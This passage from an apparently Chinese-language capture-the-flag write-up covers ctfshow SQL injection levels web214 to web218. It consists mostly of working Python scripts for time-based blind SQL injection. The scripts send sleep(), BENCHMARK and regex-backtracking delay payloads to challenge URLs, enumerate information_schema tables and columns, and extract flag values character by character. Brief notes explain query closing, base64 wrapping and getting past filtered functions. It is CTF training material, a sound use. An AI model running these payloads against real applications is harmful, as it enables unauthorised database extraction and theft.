</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;if((ascii(substr((select database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagx,ctfshow_info</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagx&#39;),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flaga</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;if((ascii(substr((select flaga from ctfshow_flagx),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,sleep(5),0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web215>web215</h2><p>还是先传参<code>ip=1&amp;debug=1</code>看到查询语句，想办法给闭合了，写出脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://653a1b2b-6829-4f6b-bc54-83e0ba08d177.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;-1&#39; or if((ascii(substr((select database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;-1&#39; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxc</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;-1&#39; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagaa</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;-1&#39; or if((ascii(substr((select flagaa from ctfshow_flagxc),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,sleep(5),0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web216>web216</h2><p>看到查询语句里面是有<code>from_base64</code>，编码一下，闭合，改改payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://013f68f0-6427-4155-9175-8e1a6229c223.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;&#39;MQ==&#39;) or if ((ascii(substr((select database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;&#39;MQ==&#39;) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxcc</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;&#39;MQ==&#39;) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxcc&#39;),{0},1)))&lt;{1},sleep(5),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagaac</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;&#39;MQ==&#39;) or if ((ascii(substr((select flagaac from ctfshow_flagxcc),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,sleep(5),0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=web217>web217</h2><p><code>sleep</code>没了，用<code>benchmark</code>绕过一下就好了<code>BENCHMARK(25000000, SHA2('test', 512))</code>这样子差不多就是5s</p><p><img src=/p/ctfshow-sql-injection/QQ20250501-175743.jpg width=1277 height=895 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://c1d1ee9a-2ee5-427a-ae6b-6b8ffd4fd40f.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;1) or if ((ascii(substr((select database()),{0},1)))&lt;{1},BENCHMARK(25000000, SHA2(&#39;test&#39;, 512)),0)#&#34;.format(i,mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},BENCHMARK(25000000, SHA2(&#39;test&#39;, 512)),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxccb</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxccb&#39;),{0},1)))&lt;{1},BENCHMARK(25000000, SHA2(&#39;test&#39;, 512)),0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagaabc</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;1) or if ((ascii(substr((select flagaabc from ctfshow_flagxccb),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,BENCHMARK(25000000, SHA2(&#39;test&#39;, 512)),0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># print(payload)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;ip&#34;</span><span class=p>:</span><span class=n>payload</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;debug&#34;</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>last_time</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span><span class=o>-</span><span class=n>start_time</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>last_time</span><span class=o>&gt;</span><span class=n>right_time</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>tail</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;right&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>head</span><span class=o>=</span><span class=n>mid</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;wrong&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>head</span><span class=o>!=</span><span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target</span><span class=o>+=</span><span class=nb>chr</span><span class=p>(</span><span class=n>head</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>但是这东西明显慢很多了</p><h2 id=web218>web218</h2><p><code>benchmark</code>没了，这里使用正则回溯达到延时(这么S?)</p><p><code>RPAD(1, 999999, 'a')</code> 会创建一个包含1个"1"和999998个"a"的字符串，<code>concat</code>连接巨大字符串，并且正则表达式是贪婪的，所以回溯就会很久</p><p><img src=/p/ctfshow-sql-injection/QQ20250501-185152.jpg width=716 height=513 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://cb28e2bd-e328-4c20-bbe7-274d23befca5.challenge.ctf.show/api/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>right_time</span><span class=o>=</span><span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>sleep</span><span class=o>=</span><span class=s2>&#34;(concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;)&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span><span class=o>+=</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>head</span><span class=o>=</span><span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>tail</span><span class=o>=</span><span class=mi>127</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>head</span><span class=o>+</span><span class=mi>1</span><span class=o>&lt;</span><span class=n>tail</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span><span class=o>=</span><span class=p>(</span><span class=n>head</span> <span class=o>+</span> <span class=n>tail</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload=&#34;1) or if ((ascii(substr((select database()),{0},1)))&lt;{1},{2},0)#&#34;.format(i,mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># ctfshow_flagxc</span>
</span></span><span class=line><span class=cl>        <span class=c1># payload = &#34;1) or if ((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_flagxc&#39;),{0},1)))&lt;{1},{2},0)#&#34;.format(</span>
</span></span><span class=line><span class=cl>        <span class=c1>#     i, mid,sleep)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id,flagaac</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;1) or if ((ascii(substr((select flagaac from ctfshow_flagxc),</span><span class=si>{0}</span><span class=s2>,1)))&lt;</span><span class=si>{1}</span><span class=s2>,</span><span class=si>{2}</span><span class=s2>,0)#&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span>
